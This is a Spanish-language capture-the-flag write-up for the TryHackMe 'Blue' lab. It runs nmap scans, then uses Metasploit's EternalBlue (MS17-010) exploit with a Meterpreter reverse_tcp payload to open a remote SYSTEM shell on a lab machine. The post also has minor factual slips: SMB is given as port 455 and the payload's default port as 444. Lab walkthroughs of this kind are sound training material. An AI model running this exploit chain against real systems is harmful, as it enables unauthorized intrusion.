---
title : Máquina|Blue|THM|SMB|EternalBlue 
published : True
---

<div class="contenedor imgc">
    <img class="imgc" src="imgs/blue/blue.gif" style="width: 169px" alt="Cheese logo">
    <div> 
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Dificultad: Fácil </p>
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Url: <a href="https://tryhackme.com/room/blue" style="color: lightblue;">Blue</a></p>
    </div>
</div>

<h2><font color="white"><center># Blue</center></font></h2>
* <p>Empezaremos con el reconocimiento de la maquina</p>
> ping -c 1 10.10.157.254
>
<img src="/imgs/blue/blue0.jpg"/>
* <p>Vemos que en la imagen el ttl es de 127 lo que indica que es una maquina windows, ahora vemos que puertos están abiertos.</p>
> nmap --min-rate 5000 -Pn -sS --open 10.10.157.254 -o allports
>
<img src="/imgs/blue/blue1.jpg"/>
* <p>tiene el puerto smb abierto 455 veremos si tiene vulnerabilidades, con nmap.</p>
> nmap --script smb-vuln* 10.10.127.254
>
<img src="/imgs/blue/blue2.jpg"/>
* <p>Al paracer es vulnerable a ( ms17-010 EternalBlue ), ahora explotemos conmsfconsole, usamos el exploit EternalBlue </p>
> use exploit/windows/smb/ms17_010_eternalblue
>
<img src="/imgs/blue/blue3.jpg"/>
* <p>Ahora indicamos el payload que queremos ejecutar una vez ganado acceso a la maquina.</p>
> set payload windows/meterpreter/reverse_tcp
>
<img src="/imgs/blue/blue4.jpg"/>
* <p>Indicamos la ip de la maquina victima con set rhosts.</p>
>
<img src="/imgs/blue/blue5.jpg"/>
* <p>Ahora indicamos nuestra ip tun0 de nuestra vpn de tryHackMe.</p>
>
<img src="/imgs/blue/blue6.jpg"/>
* <p>Seguidamente cambiamos el puerto 444 que viene por defecto para el payload, en caso de que haya un firewall indicado para cerrar conecciones
por el puerto 444.</p>
>
<img src="/imgs/blue/blue7.jpg"/>
* <p>Seguidamente ejecutamos exploit para iniciar el ataque.</p>
>
<img src="/imgs/blue/blue8.jpg"/>
* <p>Listo si ejecuta el comando Shell, y pone whoami sera autority system.</p>


